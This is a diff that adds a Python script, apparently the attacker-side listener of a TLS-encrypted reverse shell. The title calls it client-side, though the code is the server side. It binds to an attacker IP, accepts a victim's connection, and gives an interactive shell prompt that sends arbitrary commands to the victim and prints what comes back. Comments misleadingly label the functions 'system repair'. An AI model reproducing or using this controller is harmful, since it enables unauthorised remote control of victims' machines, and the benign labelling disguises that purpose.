@@ -1,0 +1,160 @@
+Basic Reverse Shell { Client-Side }
+
+import socket
+import subprocess
+import ssl
+import time
+
+# Specify the attacker's IP and port
+attacker_ip = "YOUR_ATTACKER_IP"
+attacker_port = 9999
+
+# Define the locations of the certificate and key files
+CERT_FILE = 'server.crt'
+KEY_FILE = 'server.key'
+
+# Create a context for SSL/TLS
+context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+# Load the server's certificate and private key
+try:
+    context.load_cert_chain(CERT_FILE, KEY_FILE)
+except FileNotFoundError as e:
+    print(f"Error loading certificate or key file: {e}")
+    exit()
+
+# Set up the listener socket
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reusing the address
+server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)  # Enable keep-alive
+try:
+    server_socket.bind((attacker_ip, attacker_port))
+    server_socket.listen(1)
+    print(f"Listening on {attacker_ip}:{attacker_port}...")
+except socket.error as e:
+    print(f"Socket error: {e}")
+    exit()
+
+secure_client_socket = None  # Initialize outside the try block
+client_address = None
+
+# Accept the connection from the victim's machine and wrap it with SSL/TLS
+try:
+    client_socket, client_address = server_socket.accept()
+    secure_client_socket = context.wrap_socket(client_socket, server_side=True)
+    print(f"Connection established with {client_address} (encrypted)")
+except socket.error as e:
+    print(f"Error accepting connection: {e}")
+    if secure_client_socket:
+        secure_client_socket.close()
+    server_socket.close()
+    exit()
+except ssl.SSLError as e:
+    print(f"SSL error during connection: {e}")
+    if 'client_socket' in locals():
+        client_socket.close()
+    server_socket.close()
+    exit()
+
+# Define some basic functions for system repair
+def system_info():
+    """Get basic system information."""
+    try:
+        return secure_client_socket.recv(4096).decode() # Receive response from client
+    except (ConnectionResetError, BrokenPipeError) as e:
+        print(f"Connection error: {e}")
+        return None
+
+def list_processes():
+    """List running processes."""
+    try:
+        secure_client_socket.send(b"list_processes") # Send command to client
+        return secure_client_socket.recv(4096).decode() # Receive response
+    except (ConnectionResetError, BrokenPipeError) as e:
+        print(f"Connection error: {e}")
+        return None
+
+def kill_process(pid):
+    """Kill a process by its PID."""
+    try:
+        secure_client_socket.send(f"kill {pid}".encode()) # Send command
+        return secure_client_socket.recv(1024).decode() # Receive response
+    except (ConnectionResetError, BrokenPipeError) as e:
+        print(f"Connection error: {e}")
+        return None
+
+def check_disk_usage():
+    """Check disk usage."""
+    try:
+        secure_client_socket.send(b"check_disk_usage") # Send command
+        return secure_client_socket.recv(4096).decode() # Receive response
+    except (ConnectionResetError, BrokenPipeError) as e:
+        print(f"Connection error: {e}")
+        return None
+
+def network_interfaces():
+    """Check network interfaces."""
+    try:
+        secure_client_socket.send(b"network_interfaces") # Send command
+        return secure_client_socket.recv(4096).decode() # Receive response
+    except (ConnectionResetError, BrokenPipeError) as e:
+        print(f"Connection error: {e}")
+        return None
+
+def bash_shell(command):
+    """Execute a command in the bash shell."""
+    try:
+        secure_client_socket.send(command.encode()) # Send command
+        return secure_client_socket.recv(4096).decode() # Receive response
+    except (ConnectionResetError, BrokenPipeError) as e:
+        print(f"Connection error: {e}")
+        return None
+
+# Function to handle sending commands and receiving responses
+def handle_command(command):
+    if command.lower() == "system_info":
+        secure_client_socket.send(b"system_info")
+        response = secure_client_socket.recv(4096).decode()
+    elif command.lower() == "list_processes":
+        secure_client_socket.send(b"list_processes")
+        response = secure_client_socket.recv(4096).decode()
+    elif command.lower().startswith("kill_process"):
+        parts = command.split()
+        if len(parts) == 2 and parts[1].isdigit():
+            pid = parts[1]
+            secure_client_socket.send(f"kill {pid}".encode())
+            response = secure_client_socket.recv(1024).decode()
+        else:
+            response = "Invalid 'kill_process' command. Usage: kill_process <PID>"
+    elif command.lower() == "check_disk_usage":
+        secure_client_socket.send(b"check_disk_usage")
+        response = secure_client_socket.recv(4096).decode()
+    elif command.lower() == "network_interfaces":
+        secure_client_socket.send(b"network_interfaces")
+        response = secure_client_socket.recv(4096).decode()
+    elif command.lower() == "exit":
+        secure_client_socket.send(b"exit")
+        return False  # Signal to exit the loop
+    else:
+        secure_client_socket.send(command.encode())
+        response = secure_client_socket.recv(4096).decode()
+    print(response)
+    return True
+
+# Start receiving and sending commands
+if secure_client_socket:
+    try:
+        while True:
+            command = input(f"Shell@{client_address}> ")
+            if not handle_command(command):
+                break
+    except (ConnectionResetError, BrokenPipeError):
+        print("Connection lost with the client.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+    finally:
+        if secure_client_socket:
+            secure_client_socket.close()  # Close the secure client socket
+        server_socket.close()  # Close the server socket
+else:
+    print("Failed to establish a secure connection.")
+    server_socket.close()
